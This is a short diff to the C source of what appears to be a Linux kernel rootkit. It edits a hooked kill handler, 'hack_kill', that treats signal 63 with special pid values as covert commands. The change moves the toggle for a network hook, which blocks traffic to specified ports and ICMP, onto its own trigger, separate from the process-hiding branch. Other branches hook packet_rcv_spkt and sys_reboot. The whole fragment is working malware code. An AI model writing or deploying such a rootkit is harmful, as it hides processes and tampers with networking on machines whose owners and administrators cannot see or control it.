@@ -188,8 +188,10 @@ static asmlinkage long hack_kill(pid_t pid, int sig){
         if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"packet_rcv_spkt") == 1){
             printk(KERN_ERR "error hooking packet_rcv_spkt\n");
         }
-        switch_net_hook();
         switch_hide_process();
+    }
+    else if ((sig == 63) && (pid == 3)){
+        switch_net_hook(); // block traffic to specified ports and block ICMP
     }
     else if ((sig == 63) && (pid == 2)){
         if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_reboot") == 1){
